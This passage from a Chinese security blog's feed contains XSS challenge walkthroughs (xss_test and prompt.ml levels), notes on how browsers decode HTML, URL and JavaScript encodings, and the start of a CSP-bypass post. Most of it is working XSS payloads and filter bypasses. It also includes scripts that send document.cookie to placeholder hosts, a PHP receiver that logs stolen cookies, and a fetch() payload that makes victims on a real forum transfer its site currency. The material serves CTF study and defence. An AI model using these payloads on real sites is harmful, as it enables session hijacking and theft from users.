&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></pre><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>将 </p><pre><code> javascript:alert(1) </code></pre><p>html实体编码，然后加上 <code>%0d</code></p><pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x0a;%0dhttp://www.0aa.me%0dalert(1)</code></pre><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>这一关有点玄学</p><pre><code> &amp;t_sort=&quot; type=&quot;text&quot;onmouseover=alert`1` &quot;</code></pre><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>添加 referer </p><pre><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><p><img src="/posts/88edfa78/1582880021264.png" alt="img"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>在User-agent 处注入</p><pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>在cookie处注入</p><pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>iframe 引入了</p><pre><code> &lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;</code></pre><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>angular js</p><pre><code> http://localhost/xss_test/level15.php?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>%0a 绕过空格</p><pre><code> http://localhost/xss_test/level16.php?keyword=%3Cimg%0asrc=1%0aonerror=alert(1)%3E</code></pre><p>level17-20 都是flash相关的xss，就不写了</p><h2 id="prompt1-to-win"><a href="#prompt1-to-win" class="headerlink" title="prompt1 to win"></a>prompt1 to win</h2><p><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p><h3 id="0"><a href="#0" class="headerlink" title="0"></a>0</h3><pre><code> &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;&quot;</code></pre><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><pre><code> function escape(input) {     // tags stripping mechanism from ExtJS library     // Ext.util.Format.stripTags     var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;     input = input.replace(stripTagsRE, &#39;&#39;);      return &#39;&lt;article&gt;&#39; + input + &#39;&lt;/article&gt;&#39;; }        </code></pre><p>不能闭合标签</p><pre><code> &lt;body/onload=prompt(1)// &lt;body onload=prompt(1)//</code></pre><p><code>onload</code> 事件属性，在页面加载之后立即执行一段JavaScript</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre><code> function escape(input) {     //                      v-- frowny face     input = input.replace(/[=(]/g, &#39;&#39;);      // ok seriously, disallows equal signs and open parenthesis     return input; }        </code></pre><p>使用svg即可</p><pre><code> &lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;  &lt;svg&gt;&lt;script&gt;prompt&amp;#x28 1)&lt;/script&gt;</code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre><code> function escape(input) {     // filter potential comment end delimiters     input = input.replace(/-&gt;/g, &#39;_&#39;);      // comment the input to avoid script execution     return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;; }        </code></pre><p>新姿势get</p><pre><code> --!&gt;&lt;script&gt;prompt(1)&lt;/script</code></pre><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre><code>function escape(input) {    // make sure the script belongs to own site    // sample script: http://prompt.ml/js/test.js    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {        var script = document.createElement(&#39;script&#39;);        script.src = input;        return script.outerHTML;    } else {        return &#39;Invalid resource.&#39;;    }}        </code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre><code>function escape(input) {    // apply strict filter rules of level 0    // filter &quot;&gt;&quot; and event handlers    input = input.replace(/&gt;|on.+?=|focus/gi, &#39;_&#39;);    return &#39;&lt;input value=&quot;&#39; + input + &#39;&quot; type=&quot;text&quot;&gt;&#39;;}      </code></pre><p>新姿势。。</p><pre><code>&quot;type=image src onerror=&quot;prompt(1)</code></pre><p>或者</p><pre><code>&quot;type=image src onerror=prompt(1) </code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre><code> function escape(input) {     // let&#39;s do a post redirection     try {         // pass in formURL#formDataJSON         // e.g. http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}         var segments = input.split(&#39;#&#39;);         var formURL = segments[0];         var formData = JSON.parse(segments[1]);          var form = document.createElement(&#39;form&#39;);         form.action = formURL;         form.method = &#39;post&#39;;          for (var i in formData) {             var input = form.appendChild(document.createElement(&#39;input&#39;));             input.name = i;             input.setAttribute(&#39;value&#39;, formData[i]);         }          return form.outerHTML + &#39;                         \n\ &lt;script&gt;                                                  \n\     // forbid javascript: or vbscript: and data: stuff    \n\     if (!/script:|data:/i.test(document.forms[0].action)) \n\         document.forms[0].submit();                       \n\     else                                                  \n\         document.write(&quot;Action forbidden.&quot;)               \n\ &lt;/script&gt;                                                 \n\         &#39;;     } catch (e) {         return &#39;Invalid form data.&#39;;     } }      </code></pre><p>代码很复杂，但是其实就是一个构造表单的过程</p><p><img src="/posts/88edfa78/1582896974234.png" alt="img"></p><p>如果使用JavaScript伪协议，被过滤了</p><pre><code> javascript:prompt(1)#{&quot;test&quot;:1}</code></pre><p>新姿势：</p><p>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</p><p>所以如果输入</p><pre><code> javascript:prompt(1)#{&quot;action&quot;:1}</code></pre><p>得到的结果</p><pre><code> &lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;1&quot;&gt;&lt;/form&gt;                          &lt;script&gt;                                                       // forbid javascript: or vbscript: and data: stuff         if (!/script:|data:/i.test(document.forms[0].action))          document.forms[0].submit();                            else                                                           document.write(&quot;Action forbidden.&quot;)                &lt;/script&gt;     </code></pre><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><pre><code> function escape(input) {     // filter potential start-tags     input = input.replace(/&lt;([a-zA-Z])/g, &#39;&lt;_$1&#39;);     // use all-caps for heading     input = input.toUpperCase();      // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!     return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;; }     </code></pre><p>payload如下</p><pre><code> &lt;ſcript/ſrc=//⒕₨&gt;&lt;/ſcript&gt;</code></pre><p><img src="/posts/88edfa78/1582897922738.png" alt="img"></p><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><pre><code> function escape(input) {     // (╯°□°）╯︵ ┻━┻     input = encodeURIComponent(input).replace(/prompt/g, &#39;alert&#39;);     // ┬──┬ •ノ( ゜-゜ノ) chill out bro     input = input.replace(/&#39;/g, &#39;&#39;);      // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO     return &#39;&lt;script&gt;&#39; + input + &#39;&lt;/script&gt; &#39;; }        </code></pre><p>组合一下。</p><pre><code> prom&#39;pt(1)</code></pre><h2 id="XSS基础知识"><a href="#XSS基础知识" class="headerlink" title="XSS基础知识"></a>XSS基础知识</h2><pre><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;/script&gt;</code></pre><p>escape一般会进行URL编码，但是 该方法不会对 ASCII 字母和数字进行编码，也不会对下面这些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。</p><p>常用的payload</p><pre><code> &lt;script&gt;alert(/xss/);&lt;/script&gt; //经典语句  &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; &lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;a href = javasript:alert(1)&gt;</code></pre><h3 id="简单地XSS接收平台"><a href="#简单地XSS接收平台" class="headerlink" title="简单地XSS接收平台"></a>简单地XSS接收平台</h3><p>js脚本</p><pre><code> var img = document.createElement(&quot;img&quot;); img.src = &quot;http://xxx/x.php?cookie=&quot;+document.cookie; document.body.appendChild(img);</code></pre><p>接收端</p><pre><code> &lt;?php   $victim = &#39;XXS得到的 cookie:&#39;. $_SERVER[&#39;REMOTE_ADDR&#39;]. &#39;:&#39; .$_GET[&#39;cookie&#39;].&quot;\r\n\r\n&quot;;   echo htmlspecialchars($_GET[&#39;cookie&#39;]); $myfile = fopen(&quot;/aixi/XSS/xss_victim.txt&quot;, &quot;a&quot;); fwrite($myfile, $victim); ?&gt;</code></pre><h3 id="从浏览器解码看xss"><a href="#从浏览器解码看xss" class="headerlink" title="从浏览器解码看xss"></a>从浏览器解码看xss</h3><h4 id="html编码解码"><a href="#html编码解码" class="headerlink" title="html编码解码"></a>html编码解码</h4><p>浏览器会先解析html，然后解析xss，所以，如果在xss中使用到了html实体编码是没有用的</p><pre><code> &lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;/script&gt;</code></pre><p>但是却可以触发，原因是 svg支持xml,在XML中实体会自动转义,除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体</p><pre><code> &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><h4 id="JavaScript编码解码"><a href="#JavaScript编码解码" class="headerlink" title="JavaScript编码解码"></a>JavaScript编码解码</h4><p>下面无法触发，原因是浏览器看到 <code>onerror</code> 之后，调用js解析器，但是在js中，<strong>单引号，双引号和圆括号等属于控制字符，编码后将无法识别。所以对于防御来说，应该编码这些控制字符</strong></p><pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&gt;</code></pre><p>所以我们需要修改成这样</p><pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)&gt;</code></pre><p>结合上面的html编码，我们可以将 <code>\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)</code> 再进行一次html实体编码(这样就算你过滤了 <code>&#39;</code>,照样可以绕过)</p><pre><code>&lt;img src=&quot;1&quot; onerror=&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#40;&amp;#39;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#49;&amp;#39;&amp;#41;&gt;</code></pre><p>比如开发人员单纯的设置HTML实体编码为防御xss的手段，但是用户输入点确实在alert中</p><pre><code>&lt;img src = &quot;https://text.com&quot; onclick = &#39;alert(输入点)&#39;&gt;</code></pre><p>如果用户正常输入的话凡是存在<code>&lt;</code> ,<code>&quot;</code> 等都能被转码</p><p>但是攻击者可以通过语句<code>&quot;);alert(&quot;test</code> 然后HTML编码即可绕过</p><pre><code>&lt;img src = &quot;https://gss1.bdstatic.com&quot; onclick = &#39;alert(&quot;FIRST XSS | &amp;#34;&amp;#41;&amp;#59;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&quot;)&#39;&gt;</code></pre><p>发现弹窗了两次,是因为服务端进行一个HTML解码发现存在两个<code>alert()</code>弹窗于是直接弹</p><p>所以对于这种情况，正确防御XSS的方法应该是先javascript编码然后再进行HTML编码</p><h4 id="URL编码解码"><a href="#URL编码解码" class="headerlink" title="URL编码解码"></a>URL编码解码</h4><pre><code>&lt;a href = &quot;javascript:alert(3)&quot;&gt;hhhhh&lt;a&gt;</code></pre><p>浏览器看到<code>&lt;</code>满足HTML解码的条件，然后看到<code>href</code> 满足了URL编码额条件，最后看到<code>javascript</code>满足JS 解码的条件</p><p>于是我们可以反过来编码</p><p>作为攻击者我们应该反过来首先进行一个JS编码</p><pre><code> &lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>然后进行一个URL编码</p><pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>最后进行一个HTML编码</p><pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>其他栗子：</p><pre><code> &lt;a onclick=&quot;window.open(&#39;value1&#39;)&quot; href=&quot;javascript:window.open(value2)&quot;&gt;</code></pre><p>这里的value1：浏览器看到<code>&lt;</code>标签，可以HTML解码，然后看到<code>onclick</code>可以进行JS解码，最后看到<code>window.open</code>可以进行URL解码</p><p>对于value2而言：浏览器看到<code>&lt;</code>标签进行一个HTML解码，然后看到<code>href</code>进行一个URL解码，再之后看到<code>javascript</code>进行一个JS解码，最后看到了<code>window.open</code>编码进行一个URL解码</p><h3 id="XSS-payload判断是否执行练习"><a href="#XSS-payload判断是否执行练习" class="headerlink" title="XSS payload判断是否执行练习"></a>XSS payload判断是否执行练习</h3><h4 id="1-协议被编码导致无法执行"><a href="#1-协议被编码导致无法执行" class="headerlink" title="1 协议被编码导致无法执行"></a>1 协议被编码导致无法执行</h4><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></pre><p>href 丢给URL模块解析，但是协议无法识别（即被编码的<code>javascript:</code>），解码失败，不会被执行</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><pre><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></pre><p>先进行htm解码得到  </p><pre><code>javascript:%61%6c%65%72%74%28%32%29</code></pre><p>然后href丢给URL模块解析，得到</p><pre><code>javascript:alert(2)</code></pre><p>可以执行</p><h4 id="3-协议被编码，同1"><a href="#3-协议被编码，同1" class="headerlink" title="3 协议被编码，同1"></a>3 协议被编码，同1</h4><pre><code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code></pre><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><pre><code>&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</code></pre><p>无法执行，因为从HTML解析机制看，在读取<code>&lt;div&gt;</code>之后进入数据状态，<code>&amp;#60;</code>会被HTML解码，但不会进入标签开始状态，当然也就不会创建<code>img</code>元素，也就不会执行</p><h4 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h4><pre><code>&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</code></pre><p>无法执行，<code>&lt;textarea&gt;</code>是<code>RCDATA</code>元素（RCDATA elements），可以容纳文本和字符引用，注意<strong>不能容纳其他元素</strong>，HTML解码得到</p><pre><code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="6-同5-无法执行"><a href="#6-同5-无法执行" class="headerlink" title="6  同5 无法执行"></a>6  同5 无法执行</h4><pre><code>&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</code></pre><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><pre><code>&lt;button onclick=&quot;confirm(&#39;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>这里<code>onclick</code>中为标签的属性值（类比2中的<code>href</code>），会被HTML解码，得到</p><pre><code>&lt;button onclick=&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;/button&gt;</code></pre><p>然后被执行</p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><pre><code> &lt;button onclick=&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;/button&gt;</code></pre><p><code>onclick</code>中的值会交给JS处理，在JS中只有字符串和<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier" target="_blank" rel="noopener">标识符</a>能用Unicode表示，<code>&#39;</code>显然不行，JS执行失败</p><h4 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h4><pre><code> &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</code></pre><p>无法执行</p><p><code>script</code>属于原始文本元素(Raw text elements)，<strong>只可以容纳文本</strong>，注意<strong>没有字符引用</strong>，于是直接由JS处理，JS也认不出来，执行失败</p><p>原始文本元素(Raw text elements)有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p><h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code></pre><p>这里js中可以使用Unicode的，只是有些特殊字符不能编码，可以执行</p><h4 id="11-同8，关键字符被编码"><a href="#11-同8，关键字符被编码" class="headerlink" title="11 同8，关键字符被编码"></a>11 同8，关键字符被编码</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</code></pre><p>不能执行</p><h4 id="12-由于解码是字符串导致无法执行"><a href="#12-由于解码是字符串导致无法执行" class="headerlink" title="12 由于解码是字符串导致无法执行"></a>12 由于解码是字符串导致无法执行</h4><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</code></pre><p>这里看似将没毛病，但是这里<code>\u0031\u0032</code>在解码的时候会被解码为字符串<code>12</code>，注意是<strong>字符串</strong>，不是数字，文字显然是需要引号的，JS执行失败</p><p>这样就行了</p><pre><code> &lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&quot;\u0031\u0032&quot;)&lt;/script&gt;</code></pre><h4 id="14-同8无法执行"><a href="#14-同8无法执行" class="headerlink" title="14 同8无法执行"></a>14 同8无法执行</h4><pre><code> &lt;script&gt;alert(&#39;13\u0027)&lt;/script&gt;</code></pre><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><pre><code> &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;/a&gt;</code></pre><p>html解码，得到</p><pre><code> javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code></pre><p>href识别出是JavaScript协议，URL解码得到</p><pre><code> javascript:\u0061\u006c\u0065\u0072\u0074(15)</code></pre><p>可以执行</p><p>总结</p><ol><li><script>和<style>数据只能有文本，不会有HTML解码和URL解码操作</li><li><code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>里会有HTML解码操作，但不会有子元素</li><li>其他元素数据（如<code>div</code>）和元素属性数据（如<code>href</code>）中会有HTML解码操作</li><li>部分属性（如<code>href</code>）会有URL解码操作，但URL中的协议需为ASCII</li><li>JavaScript会对字符串和标识符Unicode解码</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="tools网站markdown渲染导致xss"><a href="#tools网站markdown渲染导致xss" class="headerlink" title="tools网站markdown渲染导致xss"></a>tools网站markdown渲染导致xss</h3><p><a href="https://www.hackersb.cn/hacker/235.html" target="_blank" rel="noopener">参考</a></p><p>JavaScript伪协议直接弹框</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874638329.png" alt="img"></p><p>Discuz的每一步操作都需要 formhash,获取到这个值之后就可以了</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874680248.png" alt="img"></p><p>使用图片来触发xss</p><p><img src="XSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1582874701778.png" alt="img"></p><p>最后的payload</p><pre><code> ![头像&quot; onload=alert(1);//](https://www.t00ls.net/uc_server/data/avatar/000/01/08/66_avatar_middle.jpg)</code></pre><p>之后编写js代码来偷走tubi，</p><pre><code> var formhash = document.getElementsByName(&#39;formhash&#39;)[0].value; fetch(&quot;https://www.t00ls.net/misc.php?action=userrate&amp;userratesubmit=yes&amp;infloat=yes&amp;inajax=1&amp;inajax=1&quot;, {   method: &quot;POST&quot;,   credentials: &quot;include&quot;,   headers: {     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,     &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,     &quot;Connection&quot;: &#39;keep-alive&#39;,   },   body: &quot;formhash=&quot; + formhash + &quot;&amp;tid=39705&amp;do=dashang&amp;handlekey=userrate&amp;score=%2B10&amp;reason=thanks&quot; }).then(function(res) {   if (res.ok) {     alert(&quot;谢谢你的10Tubi！！！&quot;);   } }, function(e) {   alert(&quot;Error submitting form!&quot;); });</code></pre><p>然后插入图片，引用这个js即可</p></script></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;XSS挑战&quot;&gt;&lt;a href=&quot;#XSS挑战&quot; class=&quot;headerlink&quot; title=&quot;XSS挑战&quot;&gt;&lt;/a&gt;XSS挑战&lt;/h2&gt;&lt;p&gt;(突然发现这个平台有bug，只需要在控制台alert(1)即可。。)&lt;/p&gt;
&lt;h3 id=&quot;level1&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="XSS" scheme="http://prontosil.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>绕过CSP</title>
    <link href="http://prontosil.com/posts/1e1d8fb4/"/>
    <id>http://prontosil.com/posts/1e1d8fb4/</id>
    <published>2020-03-10T07:10:40.000Z</published>
    <updated>2020-03-10T07:16:09.097Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><table><thead><tr><th><code>default-src</code></th><th><code>&#39;self&#39; cdn.example.com</code></th><th>定义资源默认加载策略</th></tr></thead><tbody><tr><td><code>script-src</code></td><td><code>&#39;self&#39; js.example.com</code></td><td>定义 JS 加载策略</td></tr><tr><td><code>style-src</code></td><td><code>&#39;self&#39; css.example.com</code></td><td>定义 CSS 加载策略</td></tr><tr><td><code>img-src</code></td><td><code>&#39;self&#39; img.example.com</code></td><td>定义图片加载策略</td></tr><tr><td><code>connect-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td><code>font-src</code></td><td><code>font.example.com</code></td><td>定义 Font 加载策略</td></tr><tr><td><code>object-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 、、 等引用资源加载策略</td></tr><tr><td><code>media-src</code></td><td><code>media.example.com</code></td><td>定义</td></tr><tr><td><code>frame-src</code></td><td><code>&#39;self&#39;</code></td><td>定义 Frame 加载策略</td></tr><tr><td><code>sandbox</code></td><td><code>allow-forms allow-scripts</code></td><td>对页面的操作应用限制，包括阻止弹出窗口，阻止插件和脚本的执行以及强制执行同源策略。可以不设置sanbox的值使得所有限制启用，或者手动启用以下属性 : <code>allow-forms</code> <code>allow-same-origin</code> <code>allow-scripts</code> <code>allow-popups</code>, <code>allow-modals</code>, <code>allow-orientation-lock</code>, <code>allow-pointer-lock</code>, <code>allow-presentation</code>, <code>allow-popups-to-escape-sandbox</code>, and <code>allow-top-navigation</code></td></tr><tr><td><code>report-uri</code></td><td><code>/some-report-uri</code></td><td>指定浏览器报告策略错误的URL，可以在HTTP头中添加<code>-Report-Only</code> 来指示浏览器只报告不阻断</td></tr><tr><td><code>child-src</code></td><td><code>&#39;self&#39;</code></td><td>child-src指令管理了套嵌浏览的部分（类似于iframe、frame标签）</td></tr><tr><td><code>form-action</code></td><td><code>&#39;self&#39;</code></td><td>定义了form表单中action的范围</td></tr><tr><td><code>frame-ancestors</code></td><td><code>&#39;none&#39;</code></td><td>定义<code>&lt;frame&gt;</code> <code>&lt;iframe&gt;</code> <code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> <code>&lt;applet&gt;</code>加载策略. 直接设置<code>‘none’</code> 几乎等于设置了<code>X-Frame-Options: DENY</code></td></tr><tr><td><code>plugin-types</code></td><td><code>application/pdf</code></td><td>设置有效的MIME类型</td></tr></tbody></table><h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><h3 id="使用CDN绕过"><a href="#使用CDN绕过" class="headerlink" title="使用CDN绕过"></a>使用CDN绕过</h3><p>一般来说，前端会用到许多的前端框架和库，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险</p><p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP</p><pre><code class="html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; https://cdnjs.cloudflare.com;&quot;&gt;&lt;!-- foo=&quot;--&gt;&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt;    {{constructor.constructor('alert(document.cookie)')()}}&lt;/div&gt;</code></pre><p><a href="https://github.com/hackmdio/codimd/pull/1112/commits/067cfe2d1eedc5a58e5548785858e38fbaa0e84b" target="_blank" rel="noopener">修复</a></p><p><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">orange师傅的文章</a></p><p>利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>通过页面跳转功能来实现</p><pre><code>location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</code></pre><h3 id="link标签绕过-比较老了"><a href="#link标签绕过-比较老了" class="headerlink" title="link标签绕过(比较老了)"></a>link标签绕过(比较老了)</h3><pre><code>&lt;!-- firefox --&gt;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//${cookie}.vps_ip&quot;&gt;&lt;!-- chrome --&gt;&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?${cookie}&quot;&gt;</code></pre><p>带外数据的写法</p><pre><code class="js">var link = document.createElement(&quot;link&quot;);link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);document.head.appendChild(link);</code></pre><p>使用条件：</p><p>k可以执行任意的js脚本，但是无法带外数据</p><h3 